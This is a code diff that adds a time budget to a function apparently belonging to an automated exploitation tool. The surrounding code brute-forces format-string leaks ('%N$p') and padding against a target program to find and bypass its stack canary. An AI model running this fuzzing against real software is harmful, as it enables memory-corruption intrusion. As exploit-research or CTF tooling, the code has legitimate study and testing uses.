@@ -53,6 +53,7 @@ Design notes
 """
 from __future__ import annotations
 
+import time
 from pathlib import Path
 from typing import List, Optional, Tuple
 
@@ -71,6 +72,10 @@ DEFAULT_MAX_OFFSET = 100
 # v3.1 L1320 + L1400: maximum parameter c and padding to test
 DEFAULT_MAX_C = 300
 DEFAULT_MAX_PADDING = 300
+
+# v4.1.18: default wall-time budget for the expensive brute-force phase.
+# ``0`` disables the guard and restores the pre-v4.1.18 unbounded search.
+DEFAULT_MAX_SECONDS = 20.0
 
 
 def leakage_canary_value(
@@ -135,6 +140,7 @@ def canary_fuzz(
     leaks: List[Tuple[int, str]],
     max_c: int = DEFAULT_MAX_C,
     max_padding: int = DEFAULT_MAX_PADDING,
+    max_seconds: Optional[float] = None,
 ) -> Optional[CanaryInfo]:
     """Fuzz for canary bypass using pre-computed format-string leaks.
 
@@ -169,6 +175,10 @@ def canary_fuzz(
             to test (default 300, matches v3.1).
         max_padding: maximum padding length to try before giving
             up on a single (c, diff) combination (default 300).
+        max_seconds: optional wall-time budget for the brute-force
+            phase.  ``None`` means "read from ``ctx.canary_max_seconds``";
+            ``0`` means unbounded.  Added in v4.1.18 to stop long
+            canary runs from monopolizing an offline batch.
 
     Returns:
         A :class:`CanaryInfo` on success; ``None`` on failure.
@@ -177,6 +187,11 @@ def canary_fuzz(
 
     if not leaks:
         return None
+
+    budget_seconds = max_seconds
+    if budget_seconds is None:
+        budget_seconds = getattr(ctx, "canary_max_seconds", DEFAULT_MAX_SECONDS)
+    deadline = None if budget_seconds <= 0 else time.monotonic() + budget_seconds
 
     if bit == 64:
         char, test = "A", "AAAAAAAA"
@@ -190,6 +205,7 @@ def canary_fuzz(
     c = 1
     i = 1
     max_i = len(leaks)
+    attempts = 0
 
     while c < max_c and i < max_i:
         # Walk j from i+1 looking for a 0x8* (likely canary) value
@@ -197,10 +213,18 @@ def canary_fuzz(
             if not leaks[j][1].startswith(_CANARY_PREFIX):
                 continue
             diff = j - i
-            found_j = True
 
             for padding in range(0, max_padding + 1):
+                if deadline is not None and time.monotonic() >= deadline:
+                    ctx.log(
+                        "canary fuzz budget exhausted after "
+                        f"{attempts} attempts (~{budget_seconds:.1f}s); "
+                        f"aborting at c={c}, diff={diff}, padding={padding}",
+                        level="warning",
+                    )
+                    return None
                 io = process(str(program))
+                attempts += 1
                 io.recv()
                 io.sendline(f"%{c}$p".encode())
                 result = io.recvline().decode().strip()
